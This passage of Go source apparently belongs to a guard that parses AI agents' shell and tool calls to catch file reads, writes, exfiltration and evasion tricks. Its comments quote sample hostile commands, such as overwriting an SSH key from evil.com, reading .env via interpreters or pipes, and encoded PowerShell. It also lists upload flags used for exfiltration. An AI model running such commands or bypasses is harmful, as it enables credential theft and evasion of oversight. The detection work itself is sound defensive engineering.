	// Attempt 1: bash parser (works for simple cmdlet calls)
	parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, parentSymtab)
	if len(parsed) > 0 {
		e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
		return
	}

	// Attempt 2: regex heuristic extraction from the raw string
	paths := extractPathsFromInterpreterCode(innerCmd)
	paths = append(paths, unquotedAbsPathRe.FindAllString(innerCmd, -1)...)
	hosts := extractHosts(strings.Fields(innerCmd))

	if len(paths) > 0 || len(hosts) > 0 {
		info.Paths = append(info.Paths, paths...)
		info.Hosts = append(info.Hosts, hosts...)
		e.inferPowerShellOperation(info, innerCmd)
		return
	}

	// Attempt 3: flag as evasive — we can't analyze the inner command
	info.Evasive = true
	info.EvasiveReason = "PowerShell inner command could not be analyzed"
}

// interpreterCodeFlags maps interpreter commands to their "execute code" flags.
// When detected, we extract quoted paths from the code string.
var interpreterCodeFlags = map[string]string{
	"python": "-c", "python3": "-c", "python2": "-c",
	"perl": "-e", "ruby": "-e", "node": "-e", "php": "-r",
}

// quotedPathRe matches absolute paths in single-quoted or double-quoted strings
// with paired quotes (not mixed). Used for interpreter code path extraction.
var quotedPathRe = regexp.MustCompile(`'(/[a-zA-Z0-9_.~/-]+)'|"(/[a-zA-Z0-9_.~/-]+)"`)

// extractPathsFromInterpreterCode extracts absolute paths from interpreter code
// strings (e.g., python3 -c "open('/home/user/.env')").
func extractPathsFromInterpreterCode(code string) []string {
	matches := quotedPathRe.FindAllStringSubmatch(code, -1)
	var paths []string
	for _, m := range matches {
		if m[1] != "" {
			paths = append(paths, m[1])
		} else if m[2] != "" {
			paths = append(paths, m[2])
		}
	}
	return paths
}

// extractFlagValue returns the value following a flag in an argument list.
// E.g., extractFlagValue(["-c", "code"], "-c") returns "code".
func extractFlagValue(args []string, flag string) string {
	for i, arg := range args {
		if arg == flag && i+1 < len(args) {
			return args[i+1]
		}
	}
	return ""
}

const maxShellRecursionDepth = 3

func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands []parsedCommand, depth int, parentSymtab map[string]string) {
	for cmdIdx, pc := range commands {
		// NOTE: HasSubst is NOT used to set Evasive here. The shell interpreter
		// expands $() in dry-run mode (builtins like echo produce real output),
		// so successfully-parsed commands with substitutions have their paths
		// correctly extracted. Evasive is only set when the runner FAILS to
		// analyze the command (see extractBashCommand line ~518).

		// Resolve the actual command name and args, skipping wrappers like sudo/env
		cmdName, args := e.resolveCommand(pc.Name, pc.Args)

		// SECURITY: Glob patterns in command name position (e.g., /???/??t, ca?)
		// bypass command DB lookup since the glob doesn't match literal entries.
		// In dry-run mode the interpreter can't expand globs (no filesystem).
		// Flag as evasive and conservatively extract all non-flag args as paths
		// (we can't know which are paths vs values). Also infer the worst-case
		// operation from matching commands.
		if strings.ContainsAny(cmdName, "*?[") {
			info.Evasive = true
			info.EvasiveReason = "command name contains glob pattern that prevents static analysis"
			// Extract all non-flag positional args as paths
			for _, arg := range args {
				if arg != "" && !strings.HasPrefix(arg, "-") {
					info.Paths = append(info.Paths, arg)
				}
			}
			// Also extract hosts (could be a network command)
			info.Hosts = append(info.Hosts, extractHosts(args)...)
			// Infer worst-case operation from glob-matching command DB entries
			e.inferGlobOperation(info, cmdName)
		}

		// Recursively parse "bash -c '...'" / "sh -c '...'" arguments.
		// Parse and expand inner command with propagated symtab in a single pass.
		if shellInterpreters[cmdName] && depth < maxShellRecursionDepth {
			if innerCmd := extractFlagValue(args, "-c"); innerCmd != "" {
				// Merge env KEY=VALUE args from the wrapper into the symtab
				innerSymtab := mergeEnvArgs(pc.Args, parentSymtab)
				// Parse and expand inner command with propagated symtab
				parsed, resolvedSymtab := e.parseShellCommandsExpand(innerCmd, innerSymtab)
				if len(parsed) > 0 {
					e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
					continue
				}
			}

			// SECURITY: Pipe-to-shell detection.
			// "echo 'cat .env' | sh" — the runner captures [echo, sh] as separate
			// parsedCommands but doesn't pipe data between them. The bare shell
			// (no -c, no args) receives nothing via stdin in dry-run mode.
			// Fix: when we see a bare shell interpreter, scan ALL commands in the
			// list for echo/printf (pipe stages run in goroutines so their order
			// in the commands slice is non-deterministic).
			if len(args) == 0 {
				found := false
				for j := range commands {
					if j == cmdIdx {
						continue
					}
					other := commands[j]
					otherName, otherArgs := e.resolveCommand(other.Name, other.Args)
					if (otherName == "echo" || otherName == "printf") && len(otherArgs) > 0 {
						pipedCmd := strings.Join(otherArgs, " ")
						parsed, resolvedSymtab := e.parseShellCommandsExpand(pipedCmd, parentSymtab)
						if len(parsed) > 0 {
							e.extractFromParsedCommandsDepth(info, parsed, depth+1, resolvedSymtab)
							found = true
						}
					}
				}
				if found {
					continue
				}
			}
		}

		// SECURITY: Pipe-to-xargs/parallel detection.
		// "echo /path/.env | xargs cat" — xargs reads paths from stdin and
		// passes them as args to the wrapped command. The runner captures
		// [echo, xargs] as separate parsedCommands but doesn't pipe data.
		// Fix: when we see a stdin-arg wrapper (xargs/parallel) that was
		// unwrapped to a known command, scan for echo/printf and treat their
		// args as file paths for the unwrapped command. No arg-count check:
		// xargs ALWAYS appends stdin items as additional args even when the
		// wrapped command has explicit args (e.g., "xargs rm -f", "xargs cat 0").
		origBase := pc.Name
		if idx := strings.LastIndex(origBase, "/"); idx != -1 {
			origBase = origBase[idx+1:]
		}
		if stdinArgWrappers[origBase] && cmdName != origBase {
			if dbInfo, ok := e.commandDB[cmdName]; ok {
				found := false
				for j := range commands {
					if j == cmdIdx {
						continue
					}
					other := commands[j]
					otherName, otherArgs := e.resolveCommand(other.Name, other.Args)
					if (otherName == "echo" || otherName == "printf") && len(otherArgs) > 0 {
						for _, arg := range otherArgs {
							// Skip echo flags (-n, -e, -E)
							if strings.HasPrefix(arg, "-") {
								continue
							}
							info.Paths = append(info.Paths, arg)
						}
						if operationPriority(dbInfo.Operation) > operationPriority(info.Operation) {
							info.Operation = dbInfo.Operation
						}
						found = true
					}
				}
				if found {
					continue
				}
			}
		}

		// Recursively parse "powershell -Command '...'" / "pwsh -c '...'".
		// Separate from shellInterpreters because inner code is PowerShell, not POSIX sh.
		if powershellInterpreters[cmdName] && depth < maxShellRecursionDepth {
			// Check -Command / -c (case-insensitive — PowerShell flags are case-insensitive)
			innerCmd := extractFlagRestCaseInsensitive(args, "-Command")
			if innerCmd == "" {
				innerCmd = extractFlagRestCaseInsensitive(args, "-c")
			}
			if innerCmd != "" {
				e.parsePowerShellInnerCommand(info, innerCmd, depth, parentSymtab)
				continue
			}

			// Check -EncodedCommand / -ec (case-insensitive)
			encodedVal := extractFlagValueCaseInsensitive(args, "-EncodedCommand")
			if encodedVal == "" {
				encodedVal = extractFlagValueCaseInsensitive(args, "-ec")
			}
			if encodedVal != "" {
				decoded, ok := decodePowerShellEncodedCommand(encodedVal)
				if ok && decoded != "" {
					info.Evasive = true
					info.EvasiveReason = "PowerShell -EncodedCommand used (base64-encoded command)"
					e.parsePowerShellInnerCommand(info, decoded, depth, parentSymtab)
				} else {
					info.Evasive = true
					info.EvasiveReason = "PowerShell -EncodedCommand could not be decoded"
				}
				continue
			}

			// No -Command or -EncodedCommand found.
			// Fall through to command DB lookup for -File and positional args.
		}

		// Look up in command database
		cmdInfo, found := e.commandDB[cmdName]
		if found {
			// Use the most dangerous operation
			if operationPriority(cmdInfo.Operation) > operationPriority(info.Operation) {
				info.Operation = cmdInfo.Operation
			}
			// Extract paths from positional arguments
			e.extractPathsFromArgs(info, cmdName, args, cmdInfo)

			// For network commands, extract hosts from all args
			if cmdInfo.Operation == OpNetwork {
				info.Hosts = append(info.Hosts, extractHosts(args)...)
			}

			// SECURITY: Network commands with file-upload flags (--post-file,
			// --body-file, -d @file) are reading those files for exfiltration.
			// Override to OpRead so file-protection rules can detect the access.
			if cmdInfo.Operation == OpNetwork {
				if hasFileUploadFlag(cmdName, args) {
					info.Operation = OpRead
				}
			}

			// SECURITY: Network commands with output flags (-O, -o, --output)
			// write downloaded content to a local file. Override to OpWrite so
			// file-protection rules can detect the write.
			// Example: "wget -O /home/user/.ssh/id_rsa https://evil.com/key"
			if cmdInfo.Operation == OpNetwork || info.Operation == OpNetwork {
				if hasOutputFlag(cmdName, args) {
					info.Operation = OpWrite
				}
			}

			// Extract hosts from scp/rsync user@host:path format
			if cmdName == "scp" || cmdName == "rsync" {
				for _, arg := range args {
					if host := extractScpHost(arg); host != "" {
						info.Hosts = append(info.Hosts, host)
					}
				}
			}

			// Detect tar create mode: "tar -czf archive.tar.gz dir/" is a write,
			// not a read. Check for -c short flag or --create long flag.
			if cmdName == "tar" {
				for _, arg := range args {
					if arg == "--create" {
						if operationPriority(OpWrite) > operationPriority(info.Operation) {
							info.Operation = OpWrite
						}
						break
					}
					if strings.HasPrefix(arg, "-") && !strings.HasPrefix(arg, "--") && strings.Contains(arg, "c") {
						if operationPriority(OpWrite) > operationPriority(info.Operation) {
							info.Operation = OpWrite
						}
						break
					}
				}
			}

			// Detect sed in-place mode: "sed -i 's/foo/bar/' file" modifies
			// the file. Also handles -i.bak (suffix variant) and --in-place.
			if cmdName == "sed" {
				for _, arg := range args {
					if arg == "--in-place" || (strings.HasPrefix(arg, "-i") && !strings.HasPrefix(arg, "--")) {
						if operationPriority(OpWrite) > operationPriority(info.Operation) {
							info.Operation = OpWrite
						}
						break
					}
				}
			}
		}

		// Extract paths from interpreter code strings (python -c, perl -e, etc.)
		// When file paths are found in interpreter code, set OpRead regardless
		// of the command DB operation. "python3 -c 'open(/home/.env)'" is
		// primarily a file read, and file-protection rules match on read/write/
		// delete — not execute. Without this, interpreter code bypasses all
		// path-based security rules.
		if flag, ok := interpreterCodeFlags[cmdName]; ok {
			if code := extractFlagValue(args, flag); code != "" {
				paths := extractPathsFromInterpreterCode(code)
				if len(paths) > 0 {
					info.Paths = append(info.Paths, paths...)
					info.Operation = OpRead
				}
			}
		}

		// Add output redirect target paths (always a write)
		if len(pc.RedirPaths) > 0 {
			info.Paths = append(info.Paths, pc.RedirPaths...)
			if operationPriority(OpWrite) > operationPriority(info.Operation) {
				info.Operation = OpWrite
			}
		}

		// Add input redirect source paths (always a read)
		if len(pc.RedirInPaths) > 0 {
			info.Paths = append(info.Paths, pc.RedirInPaths...)
			if info.Operation == OpNone {
				info.Operation = OpRead
			}
		}
	}
}

// wrapperCommands are shell command wrappers that should be stripped to find
// the real command. Their first non-flag positional argument is a command name,
// not a path. We resolve through them so path extraction uses the correct
// CommandInfo for the wrapped command.
//
// Sources: Linux coreutils, util-linux, macOS, common security/debug tools.
var wrapperCommands = map[string]bool{
	// Privilege escalation / user switching
	// (su is in shellInterpreters — it uses -c like bash)
	"sudo": true, "doas": true, "pkexec": true,
	"runuser": true, "setpriv": true, "sg": true,

	// Resource control / scheduling
	"nice": true, "ionice": true, "taskset": true, "numactl": true,
	"chrt": true, "prlimit": true, "cgexec": true, "systemd-run": true,

	// Execution context modification
	"env": true, "nohup": true, "setsid": true, "stdbuf": true,
	"fakeroot": true, "faketime": true, "chpst": true,

	// Timing / limiting / repetition
	"time": true, "timeout": true, "watch": true, "chronic": true,

	// Tracing / debugging
	"strace": true, "ltrace": true, "valgrind": true, "catchsegv": true,

	// Sandboxing / isolation
	"firejail": true, "unshare": true, "nsenter": true, "chroot": true,
	"sandbox-exec": true, // macOS Seatbelt

	// Parallel / batch (also in stdinArgWrappers for pipe detection)
	"xargs": true, "parallel": true,

	// Network proxy wrappers
	"proxychains": true, "torsocks": true, "torify": true,

	// macOS-specific
	"caffeinate": true, "arch": true,

	// Shell builtins that wrap commands
	"exec": true, // exec replaces process but underlying command is the real one

	// Misc
	"flock":   true,
	"busybox": true,
	"script":  true,
}

// stdinArgWrappers are commands that read items from stdin and pass them
// as arguments to a sub-command. When piped from echo/printf, the echoed
// values become file path arguments for the wrapped command.
// Used by extractFromParsedCommandsDepth for pipe-to-xargs detection.
var stdinArgWrappers = map[string]bool{
	"xargs":    true,
	"parallel": true,
}

// wrappersWithValueArg lists wrappers whose first non-flag positional argument
// is a value (duration, priority, etc.), NOT the sub-command.
// E.g., "timeout 5 cat .env" → skip "5", real command is "cat".
//
//	"nice -n 10 cat .env" → skip "10" (after -n flag), real command is "cat".
//	"ionice -c2 cat .env" → real command is "cat" (value attached to flag).
var wrappersWithValueArg = map[string]bool{
	"timeout": true, // timeout DURATION COMMAND
	"watch":   true, // watch -n SECONDS COMMAND (but also watch COMMAND)
}

// wrapperFlagsWithValue maps wrapper commands to their flags that take a
// separate value argument. Without this, "strace -o /dev/null cat .env"
// would treat "/dev/null" as the command name instead of "cat".
var wrapperFlagsWithValue = map[string]map[string]bool{
	"strace": {"-o": true, "-e": true, "-p": true, "-S": true, "-P": true},
	"ltrace": {"-o": true, "-e": true, "-p": true, "-n": true},
	"valgrind": {"--log-file": true, "--xml-file": true, "--tool": true,
		"--suppressions": true, "--gen-suppressions": true},
	"firejail":    {"--profile": true, "--whitelist": true, "--blacklist": true, "--name": true},
	"unshare":     {"--map-user": true, "--map-group": true, "-S": true, "-G": true},
	"nsenter":     {"-t": true, "--target": true},
	"chroot":      {"--userspec": true, "--groups": true},
	"flock":       {"-w": true, "--wait": true, "-E": true, "--exit-code": true},
	"taskset":     {"-p": true},
	"numactl":     {"--cpunodebind": true, "--membind": true, "--physcpubind": true},
	"cgexec":      {"-g": true, "--sticky": true},
	"systemd-run": {"--unit": true, "--description": true, "--slice": true, "-p": true, "--property": true},
	"prlimit":     {"-p": true, "--pid": true},
	"ionice":      {"-p": true},
	"chrt":        {"-p": true},
}

// resolveCommand skips wrapper commands and returns the actual command name
// and its arguments. Handles flags, flag-values, and wrappers with leading
// value arguments (e.g., timeout DURATION COMMAND).
func (e *Extractor) resolveCommand(name string, args []string) (string, []string) {
	// Strip path prefix (e.g., /usr/bin/cat → cat)
	cmdName := name
	if idx := strings.LastIndex(cmdName, "/"); idx != -1 {
		cmdName = cmdName[idx+1:]
	}

	// Walk through wrapper commands
	for wrapperCommands[cmdName] && len(args) > 0 {
		// Skip flags of the wrapper (e.g., sudo -u root, strace -o /dev/null)
		i := 0
		knownValueFlags := wrapperFlagsWithValue[cmdName]
		for i < len(args) && strings.HasPrefix(args[i], "-") {
			flag := args[i]
			i++
			// Skip flag value if it's a separate arg and the flag takes a value.
			// Check per-wrapper map first, then fall back to common flags.
			if i < len(args) && !strings.HasPrefix(args[i], "-") {
				if knownValueFlags[flag] || flag == "-u" || flag == "-g" {
					i++
				}
			}
		}
		if i >= len(args) {
			return cmdName, nil
		}

		// For wrappers like "timeout 5 cat", skip the leading value argument
		if wrappersWithValueArg[cmdName] && looksNumeric(args[i]) && i+1 < len(args) {
			i++
		}

		// For "env", skip KEY=VALUE assignments (they set env vars, not commands)
		// e.g., "env F=/path sh -c 'cat $F'" → skip "F=/path", real cmd is "sh"
		if cmdName == "env" {
			for i < len(args) && strings.Contains(args[i], "=") && !strings.HasPrefix(args[i], "-") {
				i++
			}
		}

		if i >= len(args) {
			return cmdName, nil
		}

		cmdName = args[i]
		if idx := strings.LastIndex(cmdName, "/"); idx != -1 {
			cmdName = cmdName[idx+1:]
		}
		args = args[i+1:]
	}

	return cmdName, args
}

// inferGlobOperation matches a glob-containing command name against the command
// database and sets info.Operation to the worst-case (highest priority) operation
// among all matching entries. For example, /???/??t matches cat (read), cut (read),
// but also could match other commands — we pick the most dangerous operation.
func (e *Extractor) inferGlobOperation(info *ExtractedInfo, pattern string) {
	// Extract base name from path-like patterns: /???/??t → ??t
	base := pattern
	if idx := strings.LastIndex(pattern, "/"); idx != -1 {
		base = pattern[idx+1:]
	}
	if base == "" {
		return
	}

	bestPriority := operationPriority(info.Operation)
	for name, cmdInfo := range e.commandDB {
		matched, err := path.Match(base, name)
		if err != nil || !matched {
			continue
		}
		if p := operationPriority(cmdInfo.Operation); p > bestPriority {
			bestPriority = p
			info.Operation = cmdInfo.Operation
		}
	}
}

// looksNumeric returns true if s looks like a numeric value (integer, float, or
// duration-like strings such as "5s", "10m", "1.5h"). Used to skip value args
// in wrappers like "timeout 5s cat .env".
// networkFileUploadFlags maps network commands to flags that read a local file
// for upload/exfiltration. When these flags are present with a file path,
// the operation should be OpRead so file-protection rules can trigger.
var networkFileUploadFlags = map[string][]string{
	"wget": {"--post-file", "--body-file"},
	"curl": {"-T", "--upload-file"},
}

// hasFileUploadFlag checks if a network command's arguments include a flag
// that reads a file for upload. Handles both "--flag value" and "--flag=value".
func hasFileUploadFlag(cmdName string, args []string) bool {
	flags, ok := networkFileUploadFlags[cmdName]
	if !ok {
		return false
	}
	for _, arg := range args {
		for _, flag := range flags {
			if arg == flag || strings.HasPrefix(arg, flag+"=") {
				return true
			}
		}
	}
	return false
}

// networkOutputFlags maps network commands to flags that write downloaded
// content to a local file. When these flags are present, the operation should
// be OpWrite so file-protection rules can trigger.
var networkOutputFlags = map[string][]string{
	"wget":   {"-O", "--output-document"},
	"curl":   {"-o", "--output"},
	"aria2c": {"-o", "--out", "-d", "--dir"},
}

// hasOutputFlag checks if a network command's arguments include a flag
// that writes output to a local file.
func hasOutputFlag(cmdName string, args []string) bool {
	flags, ok := networkOutputFlags[cmdName]
	if !ok {
		return false
	}
	for _, arg := range args {
		for _, flag := range flags {
			if arg == flag || strings.HasPrefix(arg, flag+"=") {
				return true
			}
		}
	}
	return false
}

func looksNumeric(s string) bool {
	if s == "" {
		return false
	}
	// Strip optional trailing duration suffix (s, m, h, d)
	trimmed := strings.TrimRight(s, "smhd")
	if trimmed == "" {
		return false
	}
	// Check if remaining is a number (int or float)
	dotSeen := false
	for _, c := range trimmed {
		if c == '.' && !dotSeen {
			dotSeen = true
		} else if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

// extractPathsFromArgs extracts paths from parsed command arguments using the command database.
// cmdName is used to detect PowerShell cmdlets for case-insensitive flag matching.
func (e *Extractor) extractPathsFromArgs(info *ExtractedInfo, cmdName string, args []string, cmdInfo CommandInfo) {
	positionalIdx := 0
	skipNext := false
	psCmdlet := isPowerShellCmdlet(cmdName)

	for i, arg := range args {
		if skipNext {
			skipNext = false
			continue
		}

		// Check if this is a flag that takes a path argument
		isPathFlag := false
		for _, flag := range cmdInfo.PathFlags {
			if arg == flag || strings.HasPrefix(arg, flag) {
				isPathFlag = true
				break
			}
		}
		// PowerShell cmdlets: case-insensitive flag matching.
		// Scoped to Verb-Noun commands to avoid affecting POSIX flags
		// like -F (cpio), -O (wget), -C (ninja) which are case-sensitive.
		if !isPathFlag && psCmdlet {
			argLower := strings.ToLower(arg)
			for _, flag := range cmdInfo.PathFlags {
				if strings.EqualFold(arg, flag) || strings.HasPrefix(argLower, strings.ToLower(flag)) {
					isPathFlag = true
					break
				}
			}
		}

		if isPathFlag {
			// For flags like "-o", the next token is a path
			// For flags like "if=/dev/zero", the path is after the "="
			if strings.Contains(arg, "=") {
				parts := strings.SplitN(arg, "=", 2)
				if len(parts) == 2 && parts[1] != "" {
					info.Paths = append(info.Paths, parts[1])
				}
			} else if i+1 < len(args) {
				info.Paths = append(info.Paths, args[i+1])
				skipNext = true
			}
			continue
		}

		// Check if this is a skip flag (takes a non-path value)
		isSkipFlag := slices.Contains(cmdInfo.SkipFlags, arg)
		// PowerShell cmdlets: case-insensitive skip flag matching
		if !isSkipFlag && psCmdlet {
			for _, sf := range cmdInfo.SkipFlags {
				if strings.EqualFold(arg, sf) {
					isSkipFlag = true
					break
				}
			}
		}
		if isSkipFlag {
			skipNext = true
			continue
		}

		// Skip flags (including numeric flags like -10 for head/tail)
		if strings.HasPrefix(arg, "-") {
			continue
		}

		// Check if this positional index is a path
		if slices.Contains(cmdInfo.PathArgIndex, positionalIdx) && arg != "" {
			info.Paths = append(info.Paths, arg)
		}
		positionalIdx++
	}
}

// deduplicateStrings removes duplicate strings from a slice.
func deduplicateStrings(items []string) []string {
	if len(items) <= 1 {
		return items
	}
	seen := make(map[string]bool, len(items))
	result := make([]string, 0, len(items))
	for _, item := range items {
		if !seen[item] {
			seen[item] = true
			result = append(result, item)
		}
	}
	return result
}

// extractReadTool extracts info from Read/read_file tool
func (e *Extractor) extractReadTool(info *ExtractedInfo) {
	info.Operation = OpRead
	e.extractPathFields(info)
}

// extractWriteTool extracts info from Write/write_file tool
func (e *Extractor) extractWriteTool(info *ExtractedInfo) {
	info.Operation = OpWrite
	e.extractPathFields(info)
	e.extractContentField(info)
}

// extractEditTool extracts info from Edit tool
func (e *Extractor) extractEditTool(info *ExtractedInfo) {
	info.Operation = OpWrite
	e.extractPathFields(info)
	e.extractContentField(info)
}

// extractDeleteTool extracts info from delete_file tool (Cursor)
func (e *Extractor) extractDeleteTool(info *ExtractedInfo) {
	info.Operation = OpDelete
	e.extractPathFields(info)
}

// extractUnknownTool handles the default case in Layer 1: tools with unrecognized names.
// It actively tries all extraction strategies based on argument field shapes, in priority
// order, to infer what the tool does. Unlike augmentFromArgShape (Layer 2), this runs
// ONLY for unknown tools and sets the initial operation — Layer 2 can still upgrade it.
//
// Priority order:
//  1. Command field → shell AST parsing (highest signal)
//  2. URL field → host extraction + OpNetwork
//  3. Path + edit fields (old_string/new_string) → OpWrite
//  4. Path + content fields → OpWrite
//  5. Path only → OpRead
//
// All steps run unconditionally (no early returns) so multiple signals are merged.
func (e *Extractor) extractUnknownTool(info *ExtractedInfo) {
	// Step 1: Try shell AST parsing on any command-like field.
	// This catches tools like Cursor's run_terminal_cmd, Windsurf's "Run Command", etc.
	e.extractBashCommand(info)

	// Step 2: Extract hosts from URL-bearing fields.
	// This catches tools like Windsurf's "Read URL Content", MCP API tools, etc.
	// Handles both "https://evil.com/path" and scheme-less "evil.com/path".
	e.extractURLFields(info)

	// Step 3: Extract paths from known field names.
	e.extractPathFields(info)

	// Step 4: If paths were found, infer operation from accompanying fields.
	if len(info.Paths) > 0 && info.Operation == OpNone {
		// Check for edit signals (old_string/new_string)
		_, hasOld := info.RawArgs["oldstring"]
		_, hasNew := info.RawArgs["newstring"]
		if hasOld || hasNew {
			info.Operation = OpWrite
		}

		// Check for write signals (content fields)
		if info.Operation == OpNone {
			for _, f := range knownContentFields {
				if _, ok := info.RawArgs[f]; ok {
					info.Operation = OpWrite
					break
				}
			}
		}

		// Path with no other signals = read
		if info.Operation == OpNone {
			info.Operation = OpRead
		}
	}

	// Extract content for content-matching rules
	e.extractContentField(info)
}

// augmentFromArgShape scans argument fields to detect tool intent regardless
// of tool name. This is Layer 2 (shape-based) defense — it always runs after
// the name-based Layer 1 to catch bypasses via renamed tools.
// It never downgrades the operation, only upgrades via operationPriority.
// It NEVER returns early — all steps always execute.
func (e *Extractor) augmentFromArgShape(info *ExtractedInfo) {
	// Step 1: If any command field present and not yet parsed → shell AST parse
	if info.Command == "" {
		for _, field := range knownCommandFields {
			if val, ok := info.RawArgs[field]; ok {
				if len(fieldStrings(val)) > 0 {
					e.extractBashCommand(info)
					break // found a command field, no need to check more
				}
			}
		}
		// DO NOT return — continue to check url/paths below
	}

	// Step 2: Check URL-bearing fields for host extraction
	// Handles both scheme-prefixed and scheme-less URLs.
	e.extractURLFields(info)

	// Step 3: Extract paths from known field names (additive)
	existingPaths := len(info.Paths)
	e.extractPathFields(info)
	newPathsFound := len(info.Paths) > existingPaths

	// Step 4: If paths exist, infer operation from field shape
	// Use operationPriority — only UPGRADE, never downgrade
	if len(info.Paths) > 0 {
		inferredOp := OpNone

		// Check for edit signals (old_string/new_string)
		_, hasOld := info.RawArgs["oldstring"]
		_, hasNew := info.RawArgs["newstring"]
		if hasOld || hasNew {
			inferredOp = OpWrite
		}

		// Check for write signals (content fields)
		if inferredOp == OpNone {
			for _, f := range knownContentFields {
				if _, ok := info.RawArgs[f]; ok {
					inferredOp = OpWrite
					break
				}
			}
		}

		// Path only with no other signals = read
		if inferredOp == OpNone && newPathsFound {
			inferredOp = OpRead
		}

		// Only upgrade, never downgrade
		if inferredOp != OpNone && operationPriority(inferredOp) > operationPriority(info.Operation) {
			info.Operation = inferredOp
		}
	}

	// SECURITY: Expand DNS rebinding hosts — services like nip.io and sslip.io
	// resolve arbitrary IPs (e.g., 127.0.0.1.nip.io → 127.0.0.1). Add the
	// embedded IP alongside the original hostname so IP-based host rules match.
	info.Hosts = expandRebindingHosts(info.Hosts)

	// Deduplicate
	info.Paths = deduplicateStrings(info.Paths)
	info.Hosts = deduplicateStrings(info.Hosts)
}

// extractWebFetchTool extracts info from WebFetch tool
func (e *Extractor) extractWebFetchTool(info *ExtractedInfo) {
	info.Operation = OpNetwork

	if val, ok := info.RawArgs["url"]; ok {
		for _, urlStr := range fieldStrings(val) {
			host := extractHostFromURL(urlStr)
			if host != "" {
				info.Hosts = append(info.Hosts, host)
			}
			// SECURITY: Extract path from file:// URLs so path-based rules
			// can catch "WebFetch(url: file:///home/user/.ssh/id_rsa)".
			// Without this, file:// URLs bypass all path rules entirely.
			// file:// is a local read — set OpRead so path rules (which
			// typically cover read/write/delete) can match.
			if path := extractPathFromFileURL(urlStr); path != "" {
				info.Paths = append(info.Paths, path)
				info.Operation = OpRead
			}
		}
	}
}

// extractPathFromFileURL returns the local path from a file: URL.
// Handles all valid forms: file:///path, file://host/path, file:/path.
// Returns "" for non-file URLs or unparseable input.
func extractPathFromFileURL(rawURL string) string {
	u, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	if strings.EqualFold(u.Scheme, "file") && u.Path != "" {
		return path.Clean(u.Path) // normalize // and .. in file: paths
	}
	return ""
}

// extractPathFields extracts paths from known field names.
// Handles string values, []any arrays, and case-collision merged values.
func (e *Extractor) extractPathFields(info *ExtractedInfo) {
	for _, field := range knownPathFields {
		if val, ok := info.RawArgs[field]; ok {
			info.Paths = append(info.Paths, fieldStrings(val)...)
		}
	}
}

// extractURLFields extracts hosts from known URL field names.
// Handles string values, []any arrays, case-collision merged values, and scheme-less URLs.
func (e *Extractor) extractURLFields(info *ExtractedInfo) {
	for _, field := range knownURLFields {
		if val, ok := info.RawArgs[field]; ok {
			for _, u := range fieldStrings(val) {
				host := extractHostFromURLField(u)
				if host != "" {
					info.Hosts = append(info.Hosts, host)
					if operationPriority(OpNetwork) > operationPriority(info.Operation) {
						info.Operation = OpNetwork
					}
				}
				// SECURITY: file:// URLs in any tool's URL field are local reads.
				// Without this, only recognized WebFetch tools get file:// extraction.
				if p := extractPathFromFileURL(u); p != "" {
					info.Paths = append(info.Paths, p)
					info.Operation = OpRead
				}
			}
		}
	}
}

// extractContentField extracts content from Write/Edit tool args.
// Handles string values, []any arrays (from case-collision merging), etc.
// For arrays, concatenates all string values so content-matching rules see everything.
func (e *Extractor) extractContentField(info *ExtractedInfo) {
	for _, field := range knownContentFields {
		if val, ok := info.RawArgs[field]; ok {
			if strs := fieldStrings(val); len(strs) > 0 {
				info.Content = strings.Join(strs, "\n")
				return
			}
		}
	}
}

// nopCloser implements io.ReadWriteCloser as a no-op.
// Used by OpenHandler to satisfy redirect requirements without filesystem access.
type nopCloser struct{}

func (nopCloser) Read([]byte) (int, error)    { return 0, io.EOF }
func (nopCloser) Write(p []byte) (int, error) { return len(p), nil }
func (nopCloser) Close() error                { return nil }

// buildRunnerEnv creates an expand.Environ seeded with process env + parent symtab.
// Parent symtab values override process env (script assignments take precedence).
func buildRunnerEnv(processEnv, parentSymtab map[string]string) expand.Environ {
	var pairs []string
	for k, v := range processEnv {
		pairs = append(pairs, k+"="+v)
	}
	// Parent symtab overrides process env
	for k, v := range parentSymtab {
		pairs = append(pairs, k+"="+v)
	}
	return expand.ListEnviron(pairs...)
}

// extractRunnerSymtab extracts the final variable state from a Runner after Run().
// Returns a map[string]string for symtab propagation to recursive sh -c calls.
func extractRunnerSymtab(r *interp.Runner) map[string]string {
	symtab := make(map[string]string)
	for name, v := range r.Vars {
		if v.Kind == expand.String {
			symtab[name] = v.Str
		}
	}
	return symtab
}

// astHasSubst does a quick AST scan for CmdSubst/ProcSubst nodes.
// Returns true if any command or process substitution is found anywhere
// in the AST. Replaces the per-word wordHasSubst() check.
func astHasSubst(file *syntax.File) bool {
	found := false
	syntax.Walk(file, func(node syntax.Node) bool {
		if found {
			return false
		}
		switch node.(type) {
		case *syntax.CmdSubst, *syntax.ProcSubst:
			found = true
			return false
		}
		return true
	})
	return found
}

// astHasUnsafe checks for AST nodes that the mvdan.cc/sh interpreter panics on.
// Panics in interpreter-spawned goroutines (e.g., backgrounded commands) are
// unrecoverable, so we must skip the interpreter for these inputs.
func astHasUnsafe(file *syntax.File) bool {
	found := false
	syntax.Walk(file, func(node syntax.Node) bool {
		if found {
			return false
		}
		switch n := node.(type) {
		case *syntax.Stmt:
			// Backgrounded statements (cmd &) spawn goroutines we can't recover
			// panics from, and their handlers may not complete before Run returns.
			if n.Background {
				found = true
				return false
			}
		case *syntax.ParamExp:
			// ${var@op} parameter transformations (e.g., @A, @E, @Q) are not
			// fully supported by the interpreter and panic in pipe goroutines.
			if n.Exp != nil && n.Exp.Op == syntax.OtherParamOps {
				found = true
				return false
			}
		case *syntax.Lit:
			// U+FFFD in literals crashes regexp.MustCompile during glob
			// expansion inside interpreter-spawned goroutines (unrecoverable).
			if strings.ContainsRune(n.Value, '\uFFFD') {
				found = true
				return false
			}
			// Control characters (except \t, \n, \r) can crash the
			// interpreter in pipe goroutines during glob expansion.
			for _, r := range n.Value {
				if r < 0x20 && r != '\t' && r != '\n' && r != '\r' {
					found = true
					return false
				}
			}
			// Non-ASCII bytes in glob patterns crash regexp.MustCompile
			// during field expansion: the glob-to-regex converter processes
			// individual bytes, splitting multi-byte UTF-8 characters into
			// invalid sequences (e.g., ŀ → \xc5\x80 → broken regex).
			if strings.ContainsAny(n.Value, "*?[") {
				for _, b := range []byte(n.Value) {
					if b > 0x7F {
						found = true
						return false
					}
				}
			}
